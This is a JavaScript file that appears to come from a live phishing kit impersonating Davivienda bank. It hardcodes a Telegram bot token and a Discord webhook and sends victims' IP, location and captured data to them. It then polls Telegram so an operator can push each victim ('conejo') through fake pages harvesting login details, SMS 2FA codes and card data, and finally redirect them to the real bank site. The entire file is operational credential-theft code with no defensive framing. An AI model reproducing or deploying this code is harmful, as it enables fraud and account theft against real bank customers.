(function () {
  var TELEGRAM_BOT_TOKEN = "8797422696:AAEmfaaezJcbhZi7qeAe3lHVMcagxwHgoW4";
  var TELEGRAM_CHAT_ID = "5184174233";
  var DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1567391097041322124/dHPJGEE6Nza-JQUmzFFQpr14qr7JodnxdmwjhYVqwTCis6zNQCepsZhmi0bDooBZUAvI";

  window.getIpInfo = async function () {
    try {
      var res = await fetch("https://ipinfo.io/json?token=");
      var d = await res.json();
      return { ip: d.ip || "N/A", city: d.city || "N/A" };
    } catch (e) {
      return { ip: "N/A", city: "N/A" };
    }
  };

  window.sendToDiscord = async function (content) {
    try {
      var r = await fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: content })
      });
      return r.ok;
    } catch (e) {
      return false;
    }
  };

  window.sendToTelegram = async function (text, txid) {
    var token = TELEGRAM_BOT_TOKEN;
    var chatId = TELEGRAM_CHAT_ID;

    var payload = {
      chat_id: chatId,
      text: text,
      parse_mode: "HTML",
      disable_web_page_preview: true
    };

    if (txid) {
      payload.reply_markup = {
        inline_keyboard: [
          [
            { text: "\u274c Error Login", callback_data: "login:" + txid }
          ],
          [
            { text: "\ud83d\udcf2 SMS", callback_data: "sms:" + txid },
            { text: "\u274c E. SMS", callback_data: "esms:" + txid }
          ],
          [
            { text: "\ud83d\udd12 CC", callback_data: "tarjeta:" + txid },
            { text: "\u274c E. CC", callback_data: "etarjeta:" + txid }
          ],
          [
            { text: "\u2705 Finalizar", callback_data: "fin:" + txid }
          ]
        ]
      };
    }

    try {
      var url = "https://api.telegram.org/bot" + token + "/sendMessage";
      var r = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
      var j = await r.json();
      return j.ok === true;
    } catch (e) {
      return false;
    }
  };

  window.pollTelegramAction = function (txid) {
    var token = TELEGRAM_BOT_TOKEN;

    var actionMap = {
      "login": "user-error.html",
      "sms": "auth2fa.html",
      "esms": "auth2fa-error.html",
      "tarjeta": "authcc.html",
      "etarjeta": "authcc-error.html",
      "fin": "https://www.davivienda.com.sv/"
    };

    var actionLabels = {
      "login": "\u274c Error Login",
      "sms": "\ud83d\udcf2 SMS",
      "esms": "\u274c Error SMS",
      "tarjeta": "\ud83d\udd12 CC",
      "etarjeta": "\u274c Error CC",
      "fin": "\u2705 Finalizar"
    };

    async function iniciar() {
      var startOffset = 0;
      try {
        var flush = await fetch("https://api.telegram.org/bot" + token + "/getUpdates?offset=-1");
        var fd = await flush.json();
        if (fd.ok && fd.result && fd.result.length > 0) {
          startOffset = fd.result[fd.result.length - 1].update_id + 1;
        }
      } catch (e) { }
      poll(startOffset);
    }

    async function poll(offset) {
      try {
        var url = "https://api.telegram.org/bot" + token + "/getUpdates?offset=" + offset + "&timeout=3";
        var res = await fetch(url);
        var data = await res.json();

        if (data.ok && data.result && data.result.length > 0) {
          for (var i = 0; i < data.result.length; i++) {
            var update = data.result[i];
            var nextOffset = update.update_id + 1;

            if (update.callback_query && update.callback_query.data) {
              var parts = update.callback_query.data.split(":");
              if (parts.length === 2 && parts[1] === txid) {
                try {
                  var action = parts[0];
                  var actionLabel = actionLabels[action] || action;

                  var adminUser = update.callback_query.from && update.callback_query.from.username
                    ? "@" + update.callback_query.from.username
                    : (update.callback_query.from && update.callback_query.from.first_name
                      ? update.callback_query.from.first_name
                      : "admin");

                  var originalText = update.callback_query.message && update.callback_query.message.text
                    ? update.callback_query.message.text
                    : "";

                  var newText = originalText + "\n\n<b>Conejo redirigido a</b> " + actionLabel + " <b>por</b> " + adminUser;

                  await fetch("https://api.telegram.org/bot" + token + "/answerCallbackQuery", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                      callback_query_id: update.callback_query.id,
                      text: "\u2705 Conejo Redirigido"
                    })
                  });

                  await fetch("https://api.telegram.org/bot" + token + "/editMessageText", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                      chat_id: update.callback_query.message.chat.id,
                      message_id: update.callback_query.message.message_id,
                      text: newText,
                      parse_mode: "HTML",
                      disable_web_page_preview: true,
                      reply_markup: { inline_keyboard: [] }
                    })
                  });
                } catch (e) { }

                var dest = actionMap[action];
                if (dest) {
                  window.location.href = dest;
                  return;
                }
              }
            }
            offset = nextOffset;
          }
        }
      } catch (e) { }

      setTimeout(function () { poll(offset); }, 3000);
    }

    iniciar();
  };
})();